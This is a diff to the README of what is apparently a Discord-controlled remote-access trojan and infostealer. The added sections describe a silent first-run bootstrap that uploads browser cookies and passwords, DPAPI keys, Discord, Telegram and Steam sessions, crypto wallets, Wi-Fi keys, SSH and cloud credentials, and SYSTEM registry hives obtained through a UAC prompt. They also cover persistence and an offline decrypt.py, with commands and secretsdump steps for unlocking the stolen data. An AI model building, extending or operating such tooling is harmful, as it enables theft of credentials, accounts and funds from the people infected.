@@ -33,7 +33,7 @@ Local state in `state.json`: version, channel, webhook, last ID and last heartbe
 
 ## Commands
 
-`shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
+`shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `hives`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
 
 `gateway status` shows state, last ACK RTT, reconnects and last close code; `gateway restart` closes with 4000 to test resume.
 
@@ -41,9 +41,30 @@ Local state in `state.json`: version, channel, webhook, last ID and last heartbe
 
 ## Stealer
 
-The harvest ZIP includes launcher accounts, Discord token validated against `/users/@me`, Exodus, Electrum, Ledger Live, MetaMask and Phantom wallets in Chrome, Edge and Brave (each browser under its own label), `Local State`, `Cookies`, `Login_Data`, `Login_Data_For_Account`, `Web_Data`, `History`, the DPAPI `Protect/` folder, `options.txt`, `servers.dat` and a `mods/` listing. Cookies and `Login Data` are uploaded raw. The ZIP is cut at 8 MB and skips files over 2 MB.
+The harvest ZIP includes launcher accounts, the Discord token validated against `/users/@me` (or, when the stored token is encrypted, the raw LevelDB files under `discord/raw/`), Exodus, Electrum, Ledger Live, MetaMask and Phantom wallets in Chrome, Edge and Brave (each browser under its own label), `Local State`, `Cookies`, `Login_Data`, `Login_Data_For_Account`, `Web_Data`, `History` plus their `-wal` companions, the DPAPI `Protect/` folder, `options.txt`, `servers.dat` and a `mods/` listing. Cookies and `Login Data` are uploaded raw. `keys.txt` carries the unwrapped AES key; when PowerShell fails it falls back to the DPAPI-wrapped `dpapi_key=` value. The ZIP is cut at 12 MB and skips files over 2 MB.
 
 On Windows, for each detected browser it adds `keys.txt` with the AES key unwrapped through DPAPI from the user's own session (`v10=`) and the `app_bound=` blob if present. It is best-effort: if PowerShell is restricted, `error=` is left and `Local State` + `dpapi/` still work. It includes user, SID, profile and profile names with cookies or credentials.
+
+## First run
+
+On Windows the first start needs no input. About 45-75 s in, the agent runs a background bootstrap that uploads, as separate files, system recon, `cmdkey`/RDP/FTP credentials, Wi-Fi profiles with the key, Discord, Telegram, Steam and Firefox sessions, Exodus/Electrum/Ledger, the MetaMask and Phantom extension stores, `.ssh`/cloud CLI material, a screenshot, and then the SYSTEM hives after a single UAC consent (`Start-Process -Verb RunAs` → SYSTEM task → `reg save` → packed, task removed).
+
+Every step has a marker and its own upload, so a crash or a declined UAC retries only the unfinished part; the hives give up after three attempts. The same run enables `persist` and auto-update; `persist off` and `update auto off` still stick afterwards.
+
+`SHELL.md` keeps the commands for specifics: extra Windows profiles, extra browsers, repeating the hives, or repairing a botched first run.
+
+## Decrypting a harvest
+
+`decrypt.py` is the offline side of the stealer. It takes a harvest ZIP or an extracted directory and opens what the collected material allows: DPAPI masterkeys from `dpapi/Protect` plus the Windows password, browser AES keys, v10 and v20 cookies, saved passwords, Discord tokens, Exodus/Electrum/Phantom wallets and launcher accounts. Everything lands in `decrypted-<name>/` with `0600`, plus `report.json` and `summary.txt`.
+
+```
+./decrypt.py harvest-0000.zip --list                 # inventory only
+./decrypt.py harvest-0000.zip -p 'Password1'         # user DPAPI layer
+./decrypt.py harvest-0000.zip -p 'Password1' --system-masterkey <hex>
+```
+
+v20 (app-bound) cookies need the DPAPI_SYSTEM machinekey on top, which is an LSA secret: `secretsdump.py -system SYSTEM.hiv -security SECURITY.hiv LOCAL` prints it as `dpapi_machinekey`, and `--machinekey` derives the `S-1-5-18` masterkeys from the copied folder (`--system-protect`, default `dpapi/Protect/S-1-5-18`). Without it they are reported as locked. Chrome's blob format differs between Windows builds (ANSI + alg-id strings versus UTF-16 CNG), both are parsed. `cryptography` is required, `plyvel` only for Phantom and `zstandard` only for some Exodus payloads; missing optional pieces are reported, never fatal.
+
 
 ## Persistence
 
